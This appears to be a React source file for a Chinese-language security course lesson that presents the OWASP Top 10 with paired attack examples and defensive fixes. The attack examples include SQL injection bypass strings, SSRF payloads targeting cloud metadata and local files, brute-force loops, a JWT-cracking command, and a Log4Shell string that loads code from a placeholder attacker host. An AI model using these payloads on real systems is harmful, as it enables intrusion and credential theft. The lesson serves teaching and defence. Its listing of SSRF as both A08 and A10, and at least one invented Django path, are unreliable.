import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import './LessonCommon.css';

const OWASP = [
  { rank: 'A01', name: '访问控制失效', sev: 'critical', color: '#dc2626',
    desc: '用户能访问不应有权限的功能或数据。现实案例：IDOR（越权访问他人订单/账户）',
    attack: `# IDOR 漏洞示例：修改 user_id 参数访问他人数据
GET /api/orders?user_id=42   → 200 OK（正常）
GET /api/orders?user_id=43   → 200 OK（漏洞！返回了其他用户订单）

# 水平越权：访问同级别用户数据
GET /profile/edit/999  → 应返回403，但实际返回了用户999的资料

# 垂直越权：普通用户访问管理接口
GET /admin/users       → 应返回403，但实际返回了所有用户列表`,
    fix: `# ✅ 服务端始终验证权限
@app.get("/api/orders")
async def get_orders(
    user_id: int,
    current_user: User = Depends(get_current_user)
):
    # 关键：对比请求的 user_id 和当前登录用户
    if user_id != current_user.id and not current_user.is_admin:
        raise HTTPException(status_code=403, detail="禁止访问")
    return await db.get_orders(user_id)

# ✅ RBAC + 资源所有者验证（双重检查）
# ✅ 默认拒绝，白名单授权（Deny by default）
# ✅ 日志记录所有越权尝试` },
  { rank: 'A02', name: '加密失败', sev: 'critical', color: '#dc2626',
    desc: '敏感数据（密码/信用卡/个人信息）在传输或存储时未加密或使用弱加密',
    attack: `# 弱加密案例：MD5 密码哈希（已被彩虹表秒破）
# 数据库泄露后，MD5 哈希可被轻易破解
import hashlib
md5_hash = hashlib.md5("password123".encode()).hexdigest()
# → 482c811da5d5b4bc6d497ffa98491e38（已在彩虹表中）

# 使用 https://crackstation.net 可在1秒内查到原文

# HTTP 明文传输 → Wireshark 抓包直接看到密码
# 使用弱密码套件（RC4/DES/3DES）→ 可被解密`,
    fix: `# ✅ 密码：bcrypt（自动加盐，计算成本可调）
from passlib.context import CryptContext
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
hashed = pwd_context.hash("user_password")  # 每次生成不同hash
verified = pwd_context.verify("input", hashed)  # 验证

# ✅ 传输：强制 HTTPS + HSTS
Strict-Transport-Security: max-age=31536000; includeSubDomains

# ✅ 存储：敏感字段用 AES-256-GCM 加密
# ✅ 密钥存 AWS KMS / GCP Cloud KMS（不存代码/DB）` },
  { rank: 'A03', name: '注入攻击', sev: 'critical', color: '#dc2626',
    desc: 'SQL/NoSQL/OS/LDAP 注入：攻击者将恶意代码混入数据输入，被解释器执行',
    attack: `# SQL 注入：绕过登录
用户名：admin' --
密码：（任意）

# 生成的 SQL：
SELECT * FROM users WHERE username='admin' --' AND password='xxx'
# -- 注释掉了密码验证！直接以 admin 登录

# 万能注入：
' OR '1'='1
# → SELECT * FROM users WHERE id='' OR '1'='1'
# → 返回所有用户！`,
    fix: `# ✅ 参数化查询（永远不拼接 SQL 字符串）
# 错误：cursor.execute(f"SELECT * FROM users WHERE id={user_id}")
# 正确：
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# SQLAlchemy ORM（自动参数化）
user = db.query(User).filter(User.id == user_id).first()

# ✅ 使用 ORM 或存储过程
# ✅ 输入白名单验证（数字字段只允许数字）
# ✅ 数据库账号最小权限（应用账号不要 DROP 权限）
# ✅ WAF 过滤 SQL 关键字` },
  { rank: 'A04', name: '不安全设计', sev: 'high', color: '#f97316',
    desc: '设计阶段缺乏安全考虑：业务流程漏洞/缺乏安全的默认配置',
    attack: `# 业务逻辑漏洞（不是代码 Bug，而是流程设计缺陷）
# 案例：购物车价格篡改
POST /checkout
{"items": [{"id": 1, "price": -100}]}  # 负价格→到手返钱？

# 短信验证码爆破：没有频率限制
for code in range(0000, 9999):
    POST /verify {"phone": "13800138000", "code": str(code).zfill(4)}
    # 如果没有限制→10000次必成功

# 密码重置流程缺陷：token 不过期/可重用`,
    fix: `# ✅ 威胁建模（STRIDE/Attack Tree）在设计阶段发现
# ✅ 业务流程每步验证：价格必须从服务端获取，不信任客户端
# ✅ 验证码：5分钟过期 + 6次失败锁定 + 短信频率限制
# ✅ 密码重置 token：单次使用 + 15分钟过期 + 与手机号绑定
# ✅ 安全需求评审（Security User Stories）` },
  { rank: 'A05', name: '安全配置错误', sev: 'high', color: '#f97316',
    desc: '默认密码未改/不必要的服务开启/详细错误信息暴露/云存储权限配置错误',
    attack: `# 常见配置错误案例：
1. S3 Bucket 公开访问（企业数据泄露）
[  ] Block public access → OFF（错误）

2. 默认凭证未修改
admin/admin  admin/password  root/root

3. 错误信息暴露技术栈（帮助攻击者）
500 Internal Server Error: 
  psycopg2.errors.QueryCanceled at /api/user
  PostgreSQL 14.2 on x86_64-pc-linux-gnu

4. DEBUG 模式在生产开启（暴露源码/变量）
Django DEBUG=True → /.well-known/django/debug 泄露全部配置`,
    fix: `# ✅ 安全基线配置清单（每次部署强制核查）
DEBUG = False  # 生产环境
ALLOWED_HOSTS = ["api.example.com"]  # 白名单
SECURE_HSTS_SECONDS = 31536000
SESSION_COOKIE_SECURE = True

# ✅ S3 默认关闭公开访问
aws s3api put-public-access-block --bucket my-bucket \\
  --public-access-block-configuration BlockPublicAcls=true,...

# ✅ 统一错误响应（不暴露内部信息）
@app.exception_handler(Exception)
async def generic_error(req, exc):
    return JSONResponse({"error": "服务器错误，请联系支持"}, status_code=500)` },
  { rank: 'A06', name: '易受攻击组件', sev: 'high', color: '#f97316',
    desc: '使用含已知漏洞的依赖库（Log4Shell/Struts2等CVE导致数百万系统被入侵）',
    attack: `# Log4Shell（CVE-2021-44228）——史上最严重漏洞之一
# 仅需一行日志输入即可 RCE（远程代码执行）：
\${jndi:ldap://attacker.com/exploit}

# requests 库旧版 SSRF 漏洞
# Pillow 远程代码执行漏洞
# OpenSSL Heartbleed（内存泄露）

# 检查项目已知漏洞
pip-audit                    # Python
npm audit                    # Node.js
trivy image my-app:latest    # Docker 镜像扫描`,
    fix: `# ✅ 自动化依赖扫描（CI/CD 强制）
# GitHub Dependabot / Snyk / pip-audit

# ✅ 固定依赖版本 + 定期升级
# requirements.txt 精确版本
requests==2.31.0  # 不要 >= 这类宽松约束

# ✅ 软件物料清单（SBOM）
pip-audit --output-format cyclonedx-json > sbom.json

# ✅ 容器镜像定期重建（不要让基础镜像过时）
# ✅ 订阅 NVD/CVE 安全公告自动告警` },
  { rank: 'A07', name: '认证失败', sev: 'critical', color: '#dc2626',
    desc: '密码策略弱/会话固定/凭证泄露/暴力破解无防护/未过期的 JWT',
    attack: `# 暴力破解（无速率限制）
for password in wordlist:
    POST /login {"username": "admin", "password": password}
    if response.status == 200: break

# JWT 弱密钥破解（HS256 算法 + 弱密钥）
# 使用 hashcat 或 john 离线暴力破解 JWT 签名
hashcat -a 0 -m 16500 jwt.token wordlist.txt

# 会话固定攻击：登录前后 Session ID 不变`,
    fix: `# ✅ 强密码策略 + 速率限制
from slowapi import Limiter
@limiter.limit("5/minute")  # 每分钟最多5次登录尝试
async def login():...

# ✅ 多因素认证（TOTP/短信/硬件Key）
import pyotp
totp = pyotp.TOTP("base32secret")
totp.verify(user_input_code)  # 30秒内有效

# ✅ JWT：强密钥（>= 256bit随机）+ 短期有效 + RS256 算法
# ✅ 登录成功后重新生成 Session ID（防会话固定）
# ✅ 密码泄露检测（Have I Been Pwned API）` },
  { rank: 'A08', name: 'SSRF', sev: 'high', color: '#f97316',
    desc: '服务端请求伪造：攻击者让服务器向任意地址发起请求，访问内网资源/云元数据',
    attack: `# SSRF 经典案例：访问 AWS EC2 元数据
# 功能：用户提供 URL，服务器抓取内容
POST /fetch {"url": "http://169.254.169.254/latest/meta-data/iam/"}
# → 返回 EC2 实例的 IAM 角色凭证！！
# → 攻击者以此调用 AWS API，接管云账号

# 绕过简单 IP 过滤：
http://2130706433  # 10进制的 127.0.0.1
http://0x7f000001  # 16进制
http://[::]         # IPv6 回环地址`,
    fix: `# ✅ URL 白名单：只允许特定域名
import ipaddress, urllib.parse

def is_safe_url(url: str) -> bool:
    parsed = urllib.parse.urlparse(url)
    # 仅允许 HTTPS
    if parsed.scheme != "https":
        return False
    # 阻止内网 IP
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback:
            return False
    except ValueError:
        pass  # 域名（需要 DNS 解析后再检查）
    # 域名白名单
    return parsed.hostname in ALLOWED_DOMAINS

# ✅ 请求时禁用重定向（防止 DNS rebinding）
# ✅ 云环境：实例元数据 v2（IMDSv2）要求 session token` },
  { rank: 'A09', name: '安全日志失败', sev: 'medium', color: '#fbbf24',
    desc: '没有记录安全事件：攻击者在系统内活动数百天未被发现（平均停留197天）',
    attack: `# 日志不足导致的后果：
• 攻击者暴力破解3天，1000次失败登录 → 无告警
• SQL 注入成功获取数据库 → 没有异常 SQL 告警
• 权限提升 → 无操作审计日志
• 数据大量导出 → 无异常流量告警

# 日志记录不足 checklist（每项缺失都是安全风险）
□ 认证失败（登录失败/Token 无效）
□ 越权访问尝试
□ 异常 SQL 查询（UNION/DROP/--）
□ 输入验证失败（大量422错误）
□ 管理员操作（用户删除/配置变更）`,
    fix: `# ✅ 结构化日志（便于 SIEM 分析）
import structlog
logger = structlog.get_logger()

# 记录安全事件
logger.warning("auth.failed",
    username=username,
    ip=request.client.host,
    user_agent=request.headers.get("user-agent"),
    attempt_count=fail_count,
)

# ✅ 告警规则（CloudWatch/Grafana Alerting）
# 5分钟内同 IP 登录失败 10次 → 触发告警
# ✅ 日志存储 >= 1年（合规要求）
# ✅ 日志不可篡改（WORM存储/发送到中央日志服务）` },
  { rank: 'A10', name: '服务端请求伪造★', sev: 'high', color: '#f97316',
    desc: '（见 A08，2021年新增 入榜即为 Critical 类别，重点关注云环境元数据端点）',
    attack: `# 2021年 OWASP 将 SSRF 单独提出，表明其危害程度急剧上升
# 主要攻击场景：
1. 云元数据端点（169.254.169.254）→ 凭证泄露
2. 内网扫描（http://10.0.0.1~254:22/）→ 发现内网服务
3. 文件协议（file:///etc/passwd）→ 本地文件读取
4. 攻击内网 Redis/Elasticsearch → 无鉴权服务
# Kubernetes：
http://169.254.169.254/latest/meta-data/
http://kubernetes.default.svc/api/v1/namespaces/`,
    fix: `# ✅ 多层防御（参见 A08 修复方案）
# ✅ 网络层隔离：应用服务器无法直接访问169.254.169.254
# 在 AWS：启用 IMDSv2（要求 PUT 请求获取 token）
aws ec2 modify-instance-metadata-options \\
  --instance-id i-xxx \\
  --http-put-response-hop-limit 1 \\  # 防止容器访问元数据
  --http-endpoint enabled \\
  --http-tokens required              # 强制 IMDSv2` },
];

export default function LessonWebSec() {
  const navigate = useNavigate();
  const [activeVuln, setActiveVuln] = useState(0);
  const [view, setView] = useState('attack');

  const v = OWASP[activeVuln];

  return (
    <div className="lesson-sec">
      <div className="sec-badge orange">🌐 module_02 — Web 安全</div>

      <div className="sec-disclaimer">
        ⚠️ 所有漏洞演示代码仅供学习，请在 DVWA/WebGoat/HackTheBox 等合法靶场练习。
      </div>

      <div className="sec-hero">
        <h1>Web 安全：OWASP Top 10 漏洞详解</h1>
        <p>OWASP Top 10 是 Web 应用安全领域的黄金标准。每3年更新一次，代表当前最危险的10类漏洞。<strong>90%的 Web 安全漏洞</strong>都在这个清单里。</p>
      </div>

      {/* OWASP 漏洞列表 */}
      <div className="sec-section">
        <h2 className="sec-section-title">🔴 OWASP Top 10 2021（点击查看攻击/修复代码）</h2>
        <div style={{ display: 'flex', gap: '0.75rem' }}>
          {/* 左侧列表 */}
          <div style={{ width: 220, flexShrink: 0 }}>
            {OWASP.map((vuln, i) => (
              <div key={i} onClick={() => setActiveVuln(i)}
                style={{ padding: '0.6rem 0.75rem', borderRadius: '8px', cursor: 'pointer', marginBottom: '0.3rem', display: 'flex', gap: '0.5rem', alignItems: 'center', transition: 'all 0.15s',
                  background: activeVuln === i ? 'rgba(220,38,38,0.1)' : 'rgba(255,255,255,0.02)',
                  border: `1px solid \${activeVuln === i ? 'rgba(220,38,38,0.4)' : 'rgba(255,255,255,0.05)'}` }}>
                <span className={`sec-sev ${vuln.sev}`} style={{ fontSize: '0.6rem', minWidth: 28 }}>{vuln.rank}</span>
                <span style={{ fontSize: '0.75rem', color: activeVuln === i ? '#f87171' : '#5a1a1a', fontWeight: activeVuln === i ? 700 : 400 }}>{vuln.name}</span>
              </div>
            ))}
          </div>

          {/* 右侧详情 */}
          <div style={{ flex: 1, minWidth: 0 }}>
            <div style={{ marginBottom: '0.75rem', display: 'flex', gap: '0.5rem', alignItems: 'center', flexWrap: 'wrap' }}>
              <span style={{ fontWeight: 800, color: v.color, fontSize: '0.95rem' }}>{v.rank}:{v.name}</span>
              <span className={`sec-sev ${v.sev}`}>{v.sev.toUpperCase()}</span>
            </div>
            <div style={{ fontSize: '0.82rem', color: '#5a1a1a', marginBottom: '0.75rem' }}>{v.desc}</div>

            <div style={{ display: 'flex', gap: '0.4rem', marginBottom: '0.5rem' }}>
              <button className={`sec-btn \${view === 'attack' ? 'attack' : ''}`} onClick={() => setView('attack')}>⚔️ 攻击示例</button>
              <button className={`sec-btn defense \${view === 'fix' ? 'active' : ''}`} onClick={() => setView('fix')}>🛡 修复代码</button>
            </div>

            <div className="sec-terminal">
              <div className="sec-terminal-header">
                <div className="sec-terminal-dot" style={{ background: '#ef4444' }} />
                <div className="sec-terminal-dot" style={{ background: '#f59e0b' }} />
                <div className="sec-terminal-dot" style={{ background: '#22c55e' }} />
                <span style={{ marginLeft: '0.5rem', color: view === 'attack' ? '#f87171' : '#22c55e' }}>
                  {view === 'attack' ? `⚔️ ${v.rank} 攻击示例` : `🛡 ${v.rank} 修复方案`}
                </span>
              </div>
              <div className="sec-terminal-body" style={{ color: view === 'attack' ? '#ffd0d0' : '#c0ffd0', fontSize: '0.75rem' }}>
                {view === 'attack' ? v.attack : v.fix}
              </div>
            </div>
          </div>
        </div>
      </div>

      <div className="sec-nav">
        <button className="sec-btn" onClick={() => navigate('/course/security-pentest/lesson/sec-core')}>← 上一模块</button>
        <button className="sec-btn attack" onClick={() => navigate('/course/security-pentest/lesson/sqli')}>下一模块：SQL 注入实战 →</button>
      </div>
    </div>
  );
}
